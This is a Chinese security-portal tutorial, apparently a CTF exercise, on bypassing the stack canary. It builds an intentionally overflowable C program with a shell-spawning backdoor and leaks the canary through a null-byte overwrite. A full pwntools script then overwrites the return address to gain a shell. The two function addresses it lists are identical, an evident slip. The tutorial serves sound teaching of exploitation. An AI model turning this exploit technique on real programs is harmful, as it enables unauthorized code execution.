---
title: Canary保护机制及绕过
url: https://www.freebuf.com/articles/system/346608.html
source: FreeBuf网络安全行业门户
date: 2022-10-14
fetch_date: 2025-10-03T19:50:26.979402
---

# Canary保护机制及绕过

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

Canary保护机制及绕过

* ![]()
* 关注

* [系统安全](https://www.freebuf.com/articles/system)

Canary保护机制及绕过

2022-10-14 17:28:33

所属地 江西省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

# Canary基本介绍

在基本的栈溢出中，我们可以通过没有限制输入长度或限制不严格的函数等向栈中写入我们构造的数据，可写入的数据包括但不限于：

* 一段可执行的代码（关闭`NX`防护的前提下）
* 一段特意构造的返回地址等
* ......

传统的防御机制之一就是开启 **`Canary`防护**，该机制会向我们运行程序的栈底放入一串8字节的随机数据，在函数即将返回时会验证该数据是否发生改变，若发生改变则说明栈被改变了，直接`call`进`__stack_chk_fail`。验证成功则跳到`leave 和 ret`正常的返回。

![WeChat Screenshot_20221009181351.png](https://image.3001.net/images/20221011/1665495459_634571a30f7e582ef5175.png!small)

## 如何绕过

**直接获取栈中`canary`的值**
若该程序会输出我们输入的字符串，则可以在输入数据时估计超出输入的限制1字节，由于C字符串是以`'\0'`结尾的，我们多输入的1字节就会覆盖`'\0'`，在接下来的输出中，程序本身使用的输出函数没有限制输出的长度，就会将栈中位于所存数据高地址处的Canary值泄露出来，在接下来我们向栈中写入恶意返回地址的时候就可以将该值覆写回去，验证成功。

**获取`fs:28h`中的`canary`值**
通过观察汇编代码，我们可以发现每次运行程序产生的随机`canary`值都存在`fs:28h`中，接下来会将该值放入`EAX`中再`mov`进程序的栈空间内。

```
mov rax,fs:28h
mov [rbp-8],rax
```

所以若程序中存在任意读的功能的函数，就可以直接读取该地址中的值即可。

**逐字节爆破`canary`值**

其余的利用方式由于没有碰到，所以暂时不说，后续遇到了会进行补充。

## 准备环节

### 源程序

我们接下来用上述所说的第一种方式来尝试绕过一下`canary`值的校验。

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MAX_LENGTH 100

void init()
{
    setvbuf(stdin,0,_IONBF,0);
    setvbuf(stdout,0,_IONBF,0);
}

void backdoor()
{

    system("/bin/sh");

}

int main()
{

    char buf[10] = {0};

    init();
    printf("[DEBUGING] main: %p\n",main);
    printf("Hello,What's Your name?\n");

    read(0,buf,MAX_LENGTH);

    printf("%s",buf);
    printf("Welcom!\n");
    printf("But wait,WHO ARE YOU?\n");

    read(0,buf,MAX_LENGTH);

    printf("I don't know you,so bye ;)\n");

    return 0;

}
```

对应的`makefile`语句。

```
OBJS=pwn_1.c
CC=gcc # 默认就为gcc
CFLAGS+=-fstack-protector -no-pie -g

pwn_1:$(OBJS)
        $(CC) $^ $(CFLAGS) -o $@

clean:
        $(RM) *.o # 可不加
```

之后直接`make`即可，记得将源文件命名为`pwn_1.c，`之后`gcc`可能会提示报错提示`read`函数可能存在溢出的可能，不用理会。

### 可能存在的坑

记住头文件的引用，由于使用的`read`等系统调用函数，所以要进入 Unix标准库`unistd.h`。

### checksec

之后我们`checksec`该文件确保其开启了`canary`防护机制。

![WeChat Screenshot_20221011181209.png](https://image.3001.net/images/20221011/1665495477_634571b57c52da642ff57.png!small)

`Canary found`**确认开启**

### objdump

通过观察代码可以多看到我们代码中是有一个等待被我们利用的函数`backdoor()`的，所以我们的目的实际上就是在`main`函数执行完毕之后返回到该函数中，**那我们势必就要计算出该函数与`main`函数偏移之间的关系**，这样在装在后既可以通过基地址与偏移量的差值找到`backdoor`函数的地址。

```
objdmp -d pwn_1 -M intel
```

> -d 反汇编`pwn_1`中的需要执行指令的那些`section`
>
> -M 因特尔风格显示汇编代码，这样更贴近我们常见的汇编风格

# 启动！

### 确定问题所在

通过查看源程序（若无法获得源程序可以最简单的通过其行为判断），**发现其规定`read`的最大长度为`MAX_LENGTH 100`，而其`buf`空间只有`10`，所以确认存在栈溢出。**

由于接下来的实验的截图不是来自一次完整的流程，而是反复执行为的是更加详细的显示整个流程，所以可能存在前后地址/值不一样的情况。

### 确定偏移量

首先我们显示用`objdump -d pwn_1` 确认其`.text`段中`main`函数和`backdoor`函数的偏移量。

![WeChat Screenshot_20221011191456.png](https://image.3001.net/images/20221011/1665495491_634571c327c36f02283d4.png!small)

此处 （就不补0了）

* `main()`的地址为`0x401237`
* `backdoor()`的地址为`0x401237`

但对于backdoor()来说，由于前两条指令是为了保存之前的栈状态，初始化当前栈空间的，所以我们并不需要，在计算偏移量的时候直接：`0x401237 - 0x401225`即可。

接下来我们将其应用到最终的脚本中，获取实际`backdoor()`的地址。

```
from pwn import *

# from signal import signal, SIGPIPE, SIG_DFL, SIG_IGN
# signal(SIGPIPE, SIG_IGN)

p = process('./pwn_1')

# 暂停执行直到我们回车
raw_input('PAUSE')

# 将mian: 前的字符全过掉
p.recvuntil(b'main: ')

backdoor = int(p.recvuntil(b'\n',drop=True),16) - ( 0x401237 - 0x401225 )

# 将算出的地址输出给我们看一下
log.info("The backdoor address is :" + hex(backdoor))
```

由于程序中输出了`main()`函数的地址，这样就无需再另外获取了，直接接受`%p`表示的地址即可

`backdoor = int(p.recvuntil(b'\n',drop=True),16) - ( 0x401237 - 0x401225 )`

用接受到的`main()`的地址，减去刚刚计算的偏移量，就是进程中`backdoor()`的地址。

![WeChat Screenshot_20221011200055.png](https://image.3001.net/images/20221011/1665495503_634571cfa3693427f3400.png!small)

## 获取到随机的canary值

由于我们的源程序会以字符串的形式输出们输入的内容，而如前面所说 C 字符串是以`'\0'`结尾的，**所以我们只要构造第一个`read`的数据长度为`10 + 1`即可覆盖最后的`'\0'`，从而将后面高地址处的`canary`值也输出。**

光说不练假把式，先来看一下我们的脚本：

```
payload = b'a' * 11
p.sendafter(b'?',payload)

p.recvuntil(b'a' * 11)
canary = b'\0' + p.recv(7)

# 向控制台输出日志
log.info("The Random Canary num is :%x",int.from_bytes(canary,byteorder='little'))
```

* **第一个问题：为什么`canary = p.recv(7)`**
  由于我们刚刚输入了11个字节，而`buf`只有10个字节的大小，**这样我们就可以向上覆盖，覆盖掉了`canary`中的一个字节，同时可以读取到`canary`剩余的7个字节**
* **第二个问题：`int.from_bytes(canary,byteorder='little')`写法含义**
  **将字符串对象转为整型小端**显示

### 观察内存

**接下来为了方便观察所获的到的值确实是`canary`的值，所以我们使用`gdb`的`attach`黏附到我们脚本打开的程序上，来观察。**

使用方法 ：`attach + PID`（进入`gdb`后）

![WeChat Screenshot_20221011211411.png](https://image.3001.net/images/20221011/1665495515_634571db12eba00208b85.png!small)

**之前我们多覆盖了一位，将 canary 的值低一位由0覆盖为了a，这里再拼接回来即可**到此为止，我们就得到了`canary`值。

## 向栈中拼入返回地址

先拿来一块该程序的栈空间来观察。

![WeChat Screenshot_20221011205258.png](https://image.3001.net/images/20221011/1665495526_634571e6dad236dc44ac5.png!small)

第一个红色方框所圈区域，就是`main`函数返回的上一个函数的地址（见第二个红色方框），所以我们只要能覆盖该地址即可。

**为了覆盖该地址我们需要覆盖从`buf`开始到该地址的所有空间，但其中存储着`canary`的位置要将我们刚刚保存出的`canary`再次放进去即可。**

```
payload = b'a' * 10 # 覆盖数组所有空间
payload += canary # 由于数组空间后紧着的即使 canary 的空间，将该值放回去用来校验

pend = 0
payload += p64(pend) # 覆盖 rbp 指向的 8字节空间

payload += p64(backdoor) # 最终将返回地址放上我们backdoor的地址

p.sendafter(b'YOU?',payload)

# 暂停执行直到我们回车
raw_input('PAUSE')
```

![WeChat Screenshot_20221011210655.png](https://image.3001.net/images/20221011/1665495537_634571f13b86f714de878.png!small)

之后通过`gdb`查看该进程发现。
![WeChat Screenshot_20221011210639.png](https://image.3001.net/images/20221011/1665495545_634571f9da3d04b9a107d.png!small)

成功写入。

# 成功执行

![WeChat Screenshot_20221011211056.png](https://image.3001.net/images/20221011/1665495554_63457202bc153bfb3118b.png!small)

# 完整脚本

```
from pwn import *

# from signal import signal, SIGPIPE, SIG_DFL, SIG_IGN
# signal(SIGPIPE, SIG_IGN)

p = process('./pwn_1')

raw_input('PAUSE')

p.recvuntil(b'main: ')

# canary =
backdoor = int(p.recvuntil(b'\n',drop=True),16) - ( 0x401237 - 0x401225 )
log.info("The backdoor address is :" + hex(backdoor))

payload = b'a' * 11
p.sendafter(b'?',payload)

p.recvuntil(b'a' * 11)
canary = b'\0' + p.recv(7)

log.info("The Random Canary num is :%x",int.from_bytes(canary,byteorder='little'))

payload = b'a' * 10 # 覆盖数组所有空间
payload += canary # 由于数组空间后紧着的即使 canary 的空间，将该值放回去用来校验

pend = 0
payload += p64(pend) # 覆盖 rbp 指向的 8字节空间

payload += p64(backdoor) # 最终将返回地址放上我们backdoor的地址

log.info("The payload is :%x",int.from_bytes(payload,byteorder='little'))

p.sendafter(b'YOU?',payload)

p.interactive()
```

# 系统安全 # CTF

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

如何绕过

准备环节

* 源程序
* 可能存在的坑
* checksec
* objdump
* 确定问题所在
* 确定偏移量

获取到随机的canary值

* 观察内存

向栈中拼入返回地址

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)...